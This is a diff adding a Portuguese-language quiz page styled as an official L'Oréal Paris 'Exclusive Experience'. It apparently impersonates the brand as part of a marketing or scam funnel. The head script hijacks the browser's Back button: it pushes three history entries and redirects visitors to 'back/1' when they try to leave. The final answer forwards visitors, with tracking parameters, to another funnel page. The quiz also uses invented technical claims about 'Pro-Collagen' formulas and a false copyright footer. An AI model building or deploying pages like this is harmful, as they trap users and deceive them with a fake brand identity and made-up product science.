@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    <title>L'Oréal Paris | Exclusive Experience</title>
+
+   
+    
+   
+
+    
+
+    <script>
+      const link = 'back/1';
+
+      function setBackRedirect(url) {
+        let urlBackRedirect = url;
+        urlBackRedirect = urlBackRedirect =
+          urlBackRedirect.trim() +
+          (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+          document.location.search.replace('?', '').toString();
+
+        history.pushState({}, '', location.href);
+        history.pushState({}, '', location.href);
+        history.pushState({}, '', location.href);
+
+        window.addEventListener('popstate', () => {
+          console.log('onpopstate', urlBackRedirect);
+          setTimeout(() => {
+            location.href = urlBackRedirect;
+          }, 1);
+        });
+      }
+
+      setBackRedirect(link);
+    </script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;600&family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --white: #FFFFFF;
+            --deep-purple: #1A082E;
+            --royal-purple: #2D0A4E;
+            --success: #00FF88;
+            --glass: rgba(255, 255, 255, 0.03);
+            --border-glass: rgba(255, 255, 255, 0.12);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--deep-purple);
+            color: var(--white);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            overflow-y: auto;
+        }
+
+        /* Background Animado Cinematográfico */
+        .bg-vibe {
+            position: fixed; inset: 0; z-index: -1;
+            background: radial-gradient(circle at 20% 30%, #2D0A4E 0%, transparent 40%),
+                        radial-gradient(circle at 80% 70%, #4B1679 0%, transparent 40%);
+            filter: blur(80px);
+            animation: vibeMove 15s infinite alternate ease-in-out;
+        }
+
+        @keyframes vibeMove {
+            0% { transform: scale(1); opacity: 0.8; }
+            100% { transform: scale(1.2); opacity: 1; }
+        }
+
+        /* Header Centralizado */
+        header {
+            padding: 50px 20px 20px;
+            text-align: center;
+        }
+
+        .brand {
+            font-family: 'Cinzel', serif;
+            font-size: 34px;
+            letter-spacing: 12px;
+            color: var(--white);
+            text-shadow: 0 0 25px rgba(255,255,255,0.25);
+            margin-bottom: 8px;
+        }
+
+        .sub-brand {
+            font-size: 11px;
+            letter-spacing: 4px;
+            color: var(--white);
+            text-transform: uppercase;
+            font-weight: 400;
+            opacity: 0.8;
+        }
+
+        /* Progress Bar High-Tech */
+        .progress-box {
+            width: 100%; max-width: 400px;
+            margin: 20px auto 40px; padding: 0 40px;
+        }
+
+        .p-bar {
+            height: 1px; width: 100%;
+            background: rgba(255,255,255,0.1);
+            position: relative;
+        }
+
+        .p-fill {
+            position: absolute; left: 0; top: 0;
+            height: 100%; width: 25%; /* Inicial em 25% */
+            background: var(--white);
+            box-shadow: 0 0 20px rgba(255,255,255,0.6);
+            transition: width 1s cubic-bezier(0.19, 1, 0.22, 1);
+        }
+
+        /* Main Content */
+        .stage {
+            flex: 1;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        .card {
+            background: var(--glass);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border: 1px solid var(--border-glass);
+            border-radius: 40px;
+            padding: 50px 35px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 40px 100px rgba(0,0,0,0.6);
+            transition: transform 0.5s ease, opacity 0.5s ease;
+            position: absolute; /* Sobrepõe os cards */
+        }
+
+        /* Oculta os cards seguintes no começo */
+        .hidden-card {
+            opacity: 0;
+            transform: translateX(50px) scale(0.95);
+            pointer-events: none;
+            visibility: hidden;
+        }
+
+        .active-card {
+            opacity: 1;
+            transform: translateX(0) scale(1);
+            pointer-events: auto;
+            visibility: visible;
+            position: relative;
+        }
+
+        .out-card {
+            opacity: 0;
+            transform: translateX(-50px) scale(0.95);
+            pointer-events: none;
+            visibility: hidden;
+            position: absolute;
+        }
+
+        h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 26px;
+            font-weight: 400;
+            line-height: 1.4;
+            margin-bottom: 15px;
+            font-style: italic;
+            color: var(--white);
+        }
+
+        .desc {
+            font-size: 13px;
+            color: rgba(255,255,255,0.5);
+            margin-bottom: 40px;
+            letter-spacing: 0.5px;
+        }
+
+        /* Botões de Opção Premium */
+        .btn-stack { display: grid; gap: 18px; }
+
+        .btn-opt {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.08);
+            padding: 22px 28px;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.165, 0.84, 0.44, 1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: rgba(255,255,255,0.8);
+            font-size: 14px;
+        }
+
+        .btn-opt:hover {
+            background: rgba(255,255,255,0.07);
+            border-color: var(--white);
+            transform: scale(1.02);
+            color: var(--white);
+        }
+
+        .btn-opt.selected {
+            border-color: var(--success);
+            background: rgba(0, 255, 136, 0.05);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.2);
+            color: var(--success);
+            font-weight: 600;
+        }
+
+        .dot {
+            width: 10px; height: 10px;
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            transition: 0.3s;
+        }
+
+        .btn-opt.selected .dot {
+            background: var(--success);
+            border-color: var(--success);
+            box-shadow: 0 0 10px var(--success);
+        }
+
+        .spacer { height: 80px; width: 100%; }
+
+        footer {
+            padding: 40px 20px;
+            text-align: center;
+            font-size: 9px;
+            letter-spacing: 3px;
+            opacity: 0.6;
+            text-transform: uppercase;
+            color: var(--white);
+            border-top: 1px solid rgba(255,255,255,0.05);
+            margin-top: auto;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="bg-vibe"></div>
+
+    <audio id="sfx-confirm" preload="auto">
+        <source src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3" type="audio/mpeg">
+    </audio>
+
+    <header>
+        <div class="brand">L’ORÉAL</div>
+        <div class="sub-brand">Quiz Loreal 2026</div>
+    </header>
+
+    <div class="progress-box">
+        <div class="p-bar"><div class="p-fill" id="progress-fill"></div></div>
+    </div>
+
+    <div class="stage">
+        
+        <div class="card active-card" id="card-1">
+            <h2>Qual a frequência dos seus rituais de cuidado Elseve?</h2>
+            <p class="desc">Isso calibra o nível de bio-afinidade do Pro-Collagen em sua fórmula personalizada.</p>
+            <div class="btn-stack">
+                <div class="btn-opt" onclick="nextQuestion(this, 1, 50)">
+                    <span>Rituais diários completos</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="nextQuestion(this, 1, 50)">
+                    <span>3 a 4 sessões semanais</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="nextQuestion(this, 1, 50)">
+                    <span>Uso por demanda específica</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="nextQuestion(this, 1, 50)">
+                    <span>Iniciando jornada Collagen Lifter</span><div class="dot"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card hidden-card" id="card-2">
+            <h2>Qual o principal benefício que você busca ao utilizar a linha Elseve?</h2>
+            <p class="desc">A análise de suas necessidades ajuda a otimizar a distribuição do Pro-Collagen em sua fórmula.</p>
+            <div class="btn-stack">
+                <div class="btn-opt" onclick="nextQuestion(this, 2, 75)">
+                    <span>Reconstrução e Força Extrema</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="nextQuestion(this, 2, 75)">
+                    <span>Volume, Brilho e Maciez</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="nextQuestion(this, 2, 75)">
+                    <span>Hidratação Profunda Intensa</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="nextQuestion(this, 2, 75)">
+                    <span>Antienvelhecimento e Preenchimento</span><div class="dot"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card hidden-card" id="card-3">
+            <h2>Quais agressores externos seu cabelo enfrenta com mais frequência?</h2>
+            <p class="desc">A exposição ambiental determina a barreira protetora necessária na sua formulação Collagen Lifter.</p>
+            <div class="btn-stack">
+                <div class="btn-opt" onclick="nextQuestion(this, 3, 100)">
+                    <span>Uso constante de secador e chapinha</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="nextQuestion(this, 3, 100)">
+                    <span>Exposição intensa ao sol e poluição</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="nextQuestion(this, 3, 100)">
+                    <span>Processos químicos (tintura ou alisamento)</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="nextQuestion(this, 3, 100)">
+                    <span>Cloro, sal e umidade excessiva</span><div class="dot"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card hidden-card" id="card-4">
+            <h2>Como a tecnologia L'Oréal Paris pode elevar sua experiência de beleza?</h2>
+            <p class="desc">Buscamos o equilíbrio entre ciência avançada e o resultado sensorial impecável para seus fios.</p>
+            <div class="btn-stack">
+                <div class="btn-opt" onclick="finishQuiz(this)">
+                    <span>Elevando a segurança e saúde da fibra</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="finishQuiz(this)">
+                    <span>Garantindo brilho e maciez extrema</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="finishQuiz(this)">
+                    <span>Oferecendo densidade e personalidade</span><div class="dot"></div>
+                </div>
+                <div class="btn-opt" onclick="finishQuiz(this)">
+                    <span>Protocolo completo: Saúde e Proteção</span><div class="dot"></div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="spacer"></div>
+
+    <footer>
+        © 2026 L’Oréal Paris Todos os Direitos Reservados.
+    </footer>
+
+    <script>
+        // Função para transição entre as perguntas do quiz
+        function nextQuestion(element, currentCardIndex, nextProgress) {
+            // 1. Tocar o som
+            const audio = document.getElementById('sfx-confirm');
+            audio.currentTime = 0;
+            audio.play().catch(e => console.log("Áudio bloqueado"));
+
+            // 2. Animação de seleção (apaga os outros)
+            const stack = element.parentElement;
+            const options = stack.querySelectorAll('.btn-opt');
+            options.forEach(opt => {
+                if(opt !== element) opt.style.opacity = '0.1';
+            });
+            element.classList.add('selected');
+
+            // 3. Troca de cards após delay
+            setTimeout(() => {
+                const currentCard = document.getElementById(`card-${currentCardIndex}`);
+                const nextCard = document.getElementById(`card-${currentCardIndex + 1}`);
+
+                // Move o card atual para fora
+                currentCard.classList.remove('active-card');
+                currentCard.classList.add('out-card');
+
+                // Traz o próximo card
+                nextCard.classList.remove('hidden-card');
+                nextCard.classList.add('active-card');
+
+                // Atualiza a barra de progresso
+                document.getElementById('progress-fill').style.width = nextProgress + '%';
+
+            }, 500); // Aguarda meio segundo para a pessoa ver que clicou
+        }
+
+        // Função para a última pergunta (Faz o Redirecionamento Final)
+        function finishQuiz(element) {
+            const audio = document.getElementById('sfx-confirm');
+            audio.currentTime = 0;
+            audio.play().catch(e => console.log("Áudio bloqueado"));
+
+            const stack = element.parentElement;
+            const options = stack.querySelectorAll('.btn-opt');
+            options.forEach(opt => {
+                if(opt !== element) opt.style.opacity = '0.1';
+            });
+            element.classList.add('selected');
+
+            setTimeout(() => {
+                document.getElementById('card-4').classList.remove('active-card');
+                document.getElementById('card-4').classList.add('out-card');
+                
+                setTimeout(() => {
+                    // Puxa as UTMs atuais da barra de navegação
+                    const urlParams = window.location.search;
+                    
+                    // Como a última página era a "index(7).html", enviamos pra ela com as UTMs intactas
+                    window.location.href = 'index(7).html' + urlParams;
+                }, 600);
+            }, 500);
+        }
+    </script>
+</body>
+</html>
